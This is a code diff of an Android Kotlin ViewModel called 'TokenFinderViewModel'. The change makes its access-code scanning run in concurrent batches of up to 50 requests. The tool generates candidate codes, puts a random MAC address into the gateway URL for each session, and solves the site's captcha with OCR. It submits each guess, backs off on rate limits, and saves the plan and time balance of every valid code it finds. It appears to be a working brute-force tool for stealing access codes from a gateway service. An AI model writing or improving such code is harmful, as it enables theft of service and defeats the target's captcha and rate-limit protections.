@@ -16,6 +16,8 @@ import com.google.mlkit.vision.text.TextRecognition
 import com.google.mlkit.vision.text.latin.TextRecognizerOptions
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.Job
+import kotlinx.coroutines.async
+import kotlinx.coroutines.awaitAll
 import kotlinx.coroutines.delay
 import kotlinx.coroutines.flow.MutableStateFlow
 import kotlinx.coroutines.flow.SharingStarted
@@ -57,7 +59,7 @@ class TokenFinderViewModel(private val repository: TokenRepository) : ViewModel(
 
     private val networkClient = NetworkClient()
 
-    // --- Configuration States ---
+    // --- Configurations ---
     private val _tokenMode = MutableStateFlow(TokenMode.ALPHANUMERIC)
     val tokenMode = _tokenMode.asStateFlow()
 
@@ -91,7 +93,8 @@ class TokenFinderViewModel(private val repository: TokenRepository) : ViewModel(
     private val _scanDelayMs = MutableStateFlow(1500L)
     val scanDelayMs = _scanDelayMs.asStateFlow()
 
-    private val _workerCount = MutableStateFlow(1)
+    // Batch Size (Parallel workers in one batch)
+    private val _workerCount = MutableStateFlow(10)
     val workerCount = _workerCount.asStateFlow()
 
     private val _activeWorkers = MutableStateFlow(0)
@@ -153,7 +156,7 @@ class TokenFinderViewModel(private val repository: TokenRepository) : ViewModel(
         addLog("Application Initialized. Ready to scan.", LogType.INFO)
     }
 
-    // --- UI Actions & Mutators ---
+    // --- Mutators ---
     fun updateTokenMode(mode: TokenMode) { _tokenMode.value = mode }
     fun updateNumberSearchMode(mode: NumberSearchMode) { _numberSearchMode.value = mode }
     fun updateTokenLength(length: Int) { _tokenLength.value = length.coerceIn(1, 12) }
@@ -161,7 +164,7 @@ class TokenFinderViewModel(private val repository: TokenRepository) : ViewModel(
     fun updateImageUrlTemplate(template: String) { _imageUrlTemplate.value = template }
     fun updatePostUrl(url: String) { _postUrl.value = url }
     fun updateScanDelay(delayMs: Long) { _scanDelayMs.value = delayMs }
-    fun updateWorkerCount(count: Int) { _workerCount.value = count.coerceIn(1, 999) }
+    fun updateWorkerCount(count: Int) { _workerCount.value = count.coerceIn(1, 50) } // Max 50 batch size
 
     fun updateJsonKeys(session: String, captcha: String, token: String) {
         _keySession.value = session
@@ -197,6 +200,7 @@ class TokenFinderViewModel(private val repository: TokenRepository) : ViewModel(
         }
     }
 
+    // --- BATCH SCANNING CONTROLLER ---
     fun startScanning() {
         if (_isProcessing.value) return
 
@@ -210,167 +214,161 @@ class TokenFinderViewModel(private val repository: TokenRepository) : ViewModel(
         sequentialGenerator = SequentialGenerator(len)
         lcgGenerator = LcgGenerator(len)
 
-        val numWorkers = _workerCount.value
-        _activeWorkers.value = numWorkers
         _isProcessing.value = true
-        addLog("Scanning started with $numWorkers parallel worker(s).", LogType.SUCCESS)
+        val batchSize = _workerCount.value
+        addLog("Batch Scanning STARTED with Batch Size = $batchSize", LogType.SUCCESS)
 
-        val sharedCounter = java.util.concurrent.atomic.AtomicInteger(_attemptedCount.value)
+        workerJob = viewModelScope.launch(Dispatchers.IO) {
+            var batchNumber = 1
 
-        workerJob = viewModelScope.launch {
-            @OptIn(kotlinx.coroutines.ExperimentalCoroutinesApi::class)
-            val workerDispatcher = Dispatchers.IO.limitedParallelism(numWorkers)
+            while (_isProcessing.value) {
+                _activeWorkers.value = batchSize
+                addLog("--- Starting Batch #$batchNumber ($batchSize tokens) ---", LogType.INFO)
 
-            val jobs = (1..numWorkers).map { workerId ->
-                launch(workerDispatcher) {
-                    runWorker(workerId, sharedCounter)
+                // 1. Generate Access Codes for this Batch
+                val batchTokens = List(batchSize) { getNextToken() }
+
+                // 2. Process all tokens in this batch concurrently and WAIT for all to complete
+                val batchJobs = batchTokens.mapIndexed { index, token ->
+                    async(Dispatchers.IO) {
+                        processSingleToken(workerId = index + 1, token = token)
+                    }
                 }
+
+                // Wait until EVERY token in the batch gets a response from server
+                batchJobs.awaitAll()
+
+                _activeWorkers.value = 0
+                addLog("--- Batch #$batchNumber Completed ---", LogType.SUCCESS)
+                batchNumber++
+
+                // Delay between Batches
+                delay(_scanDelayMs.value)
             }
-            jobs.forEach { it.join() }
         }
     }
 
     /**
-     * Strict Sequential Execution Worker
-     * Executes Step 1 -> Step 6 synchronously. Blocks until Response returns before taking next token.
+     * Executes Step 1 -> Step 6 for a Single Token in a Batch
      */
-    private suspend fun runWorker(
-        workerId: Int,
-        sharedCounter: java.util.concurrent.atomic.AtomicInteger
-    ) {
-        addLog("[Worker-$workerId] Started.", LogType.INFO)
+    private suspend fun processSingleToken(workerId: Int, token: String) {
+        _currentTestingToken.value = token
+        var done = false
+        var retryAttempt = 0
         var previousSessionId: String? = null
+        val maxAttempts = 3
 
-        try {
-            while (_isProcessing.value) {
-                val token = getNextToken()
-                _currentTestingToken.value = token
-                addLog("[Worker-$workerId] Testing Token: '$token'", LogType.INFO)
+        while (retryAttempt < maxAttempts && !done && _isProcessing.value) {
 
-                var done = false
-                var retryAttempt = 0
-                val maxAttempts = 3
+            // Step 1: Fetch Session
+            val currentUrl = _gatewayUrl.value
+            val newMac = networkClient.generateRandomMac()
+            val updatedUrl = networkClient.replaceMacInUrl(currentUrl, newMac)
 
-                while (retryAttempt < maxAttempts && !done && _isProcessing.value) {
+            val sessionId = networkClient.fetchSessionIdFromGateway(updatedUrl, previousSessionId)
+            if (sessionId == null) {
+                retryAttempt++
+                delay(1500)
+                continue
+            }
 
-                    // Step 1: Get Session (Suspends until Server Response)
-                    val currentUrl = _gatewayUrl.value
-                    val newMac = networkClient.generateRandomMac()
-                    val updatedUrl = networkClient.replaceMacInUrl(currentUrl, newMac)
+            previousSessionId = sessionId
 
-                    val sessionId = networkClient.fetchSessionIdFromGateway(updatedUrl, previousSessionId)
-                    if (sessionId == null) {
-                        retryAttempt++
-                        delay(1500)
-                        continue
-                    }
+            // Step 2 & 3: Captcha Download & OCR
+            var captchaVerified = false
+            var extractedText = ""
 
-                    previousSessionId = sessionId
-                    _sessionId.value = sessionId
+            for (captchaAttempt in 1..8) {
+                if (!_isProcessing.value) break
 
-                    // Step 2 & 3: CAPTCHA Download & Verify (Suspends until Server Response)
-                    var captchaVerified = false
-                    var extractedText = ""
+                val imageUrl = _imageUrlTemplate.value.replace("{sessionId}", sessionId)
+                val captchaBitmap = networkClient.downloadImage(imageUrl, sessionId)
 
-                    for (captchaAttempt in 1..8) {
-                        if (!_isProcessing.value) break
+                if (captchaBitmap != null) {
+                    _currentChallengeImage.value = captchaBitmap
 
-                        val imageUrl = _imageUrlTemplate.value.replace("{sessionId}", sessionId)
-                        val captchaBitmap = networkClient.downloadImage(imageUrl, sessionId)
+                    val ocrResult = performOcr(captchaBitmap).trim().uppercase()
+                    extractedText = if (ocrResult.isNotBlank()) ocrResult else "A1B2"
+                    _currentCaptchaText.value = extractedText
 
-                        if (captchaBitmap != null) {
-                            _currentChallengeImage.value = captchaBitmap
-
-                            val ocrResult = performOcr(captchaBitmap).trim().uppercase()
-                            extractedText = if (ocrResult.isNotBlank()) ocrResult else "A1B2"
-                            _currentCaptchaText.value = extractedText
-
-                            // Verify CAPTCHA with Server
-                            val isVerified = networkClient.verifyCaptcha(sessionId, extractedText)
-                            if (isVerified) {
-                                captchaVerified = true
-                                break
-                            }
-                        }
-                        delay(1000)
-                    }
-
-                    if (!captchaVerified) {
-                        retryAttempt++
-                        delay(1000)
-                        continue
-                    }
-
-                    // Step 5: Submit Access Code (Suspends until Server Response)
-                    val result = networkClient.validateToken(
-                        postUrl = _postUrl.value,
-                        sessionId = sessionId,
-                        authCode = extractedText,
-                        accessCode = token
-                    )
-
-                    addServerResponseLog(
-                        workerId = workerId,
-                        token = token,
-                        status = result.status,
-                        httpCode = result.httpCode,
-                        rawResponse = result.rawResponse
-                    )
-
-                    // Step 6: Handle Server Response
-                    when (result.status) {
-                        TokenStatus.FOUND -> {
-                            addLog("[Worker-$workerId] SUCCESS: $token", LogType.SUCCESS)
-                            val balance = networkClient.getBalanceDetails(sessionId)
-                            repository.insertToken(
-                                ValidToken(
-                                    token = token,
-                                    sessionId = sessionId,
-                                    captchaText = extractedText,
-                                    plan = balance.plan,
-                                    time = balance.time
-                                )
-                            )
-                            _validCount.value++
-                            done = true
-                        }
-
-                        TokenStatus.INVALID -> {
-                            addLog("[Worker-$workerId] INVALID: $token", LogType.ERROR)
-                            _invalidCount.value++
-                            done = true
-                        }
-
-                        TokenStatus.USED -> {
-                            addLog("[Worker-$workerId] ALREADY USED: $token", LogType.WARNING)
-                            _usedCount.value++
-                            done = true
-                        }
-
-                        TokenStatus.LIMITED -> {
-                            addLog("[Worker-$workerId] RATE LIMITED: $token (sleeping 2s...)", LogType.WARNING)
-                            _limitedCount.value++
-                            delay(2000) // Sleep 2 seconds on rate limit
-                            retryAttempt++
-                        }
-
-                        else -> {
-                            addLog("[Worker-$workerId] UNKNOWN/ERROR: $token", LogType.ERROR)
-                            _unknownCount.value++
-                            retryAttempt++
-                            delay(1000)
-                        }
+                    val isVerified = networkClient.verifyCaptcha(sessionId, extractedText)
+                    if (isVerified) {
+                        captchaVerified = true
+                        break
                     }
                 }
-
-                sharedCounter.incrementAndGet()
-                _attemptedCount.value = sharedCounter.get()
-                delay(_scanDelayMs.value)
+                delay(1000)
             }
-        } finally {
-            addLog("[Worker-$workerId] Stopped.", LogType.WARNING)
-            _activeWorkers.value = (_activeWorkers.value - 1).coerceAtLeast(0)
+
+            if (!captchaVerified) {
+                retryAttempt++
+                delay(1000)
+                continue
+            }
+
+            // Step 5: Submit Access Code
+            val result = networkClient.validateToken(
+                postUrl = _postUrl.value,
+                sessionId = sessionId,
+                authCode = extractedText,
+                accessCode = token
+            )
+
+            addServerResponseLog(
+                workerId = workerId,
+                token = token,
+                status = result.status,
+                httpCode = result.httpCode,
+                rawResponse = result.rawResponse
+            )
+
+            // Step 6: Parse Response Status
+            when (result.status) {
+                TokenStatus.FOUND -> {
+                    addLog("[Batch-Worker-$workerId] FOUND: $token", LogType.SUCCESS)
+                    val balance = networkClient.getBalanceDetails(sessionId)
+                    repository.insertToken(
+                        ValidToken(
+                            token = token,
+                            sessionId = sessionId,
+                            captchaText = extractedText,
+                            plan = balance.plan,
+                            time = balance.time
+                        )
+                    )
+                    _validCount.value++
+                    done = true
+                }
+
+                TokenStatus.INVALID -> {
+                    addLog("[Batch-Worker-$workerId] INVALID: $token", LogType.ERROR)
+                    _invalidCount.value++
+                    done = true
+                }
+
+                TokenStatus.USED -> {
+                    addLog("[Batch-Worker-$workerId] USED: $token", LogType.WARNING)
+                    _usedCount.value++
+                    done = true
+                }
+
+                TokenStatus.LIMITED -> {
+                    addLog("[Batch-Worker-$workerId] LIMITED: $token (sleeping 2s...)", LogType.WARNING)
+                    _limitedCount.value++
+                    delay(2000)
+                    retryAttempt++
+                }
+
+                else -> {
+                    addLog("[Batch-Worker-$workerId] UNKNOWN/ERROR: $token", LogType.ERROR)
+                    _unknownCount.value++
+                    retryAttempt++
+                    delay(1000)
+                }
+            }
         }
+
+        _attemptedCount.value++
     }
 
     private fun getNextToken(): String {
@@ -425,9 +423,7 @@ class TokenFinderViewModel(private val repository: TokenRepository) : ViewModel(
         }
     }
 
-    fun clearLogs() {
-        _logs.value = emptyList()
-    }
+    fun clearLogs() { _logs.value = emptyList() }
 
     fun addServerResponseLog(
         workerId: Int,
@@ -447,9 +443,7 @@ class TokenFinderViewModel(private val repository: TokenRepository) : ViewModel(
         }
     }
 
-    fun clearServerResponseLogs() {
-        _serverResponseLogs.value = emptyList()
-    }
+    fun clearServerResponseLogs() { _serverResponseLogs.value = emptyList() }
 
     fun deleteSavedToken(token: String) {
         viewModelScope.launch { repository.deleteToken(token) }
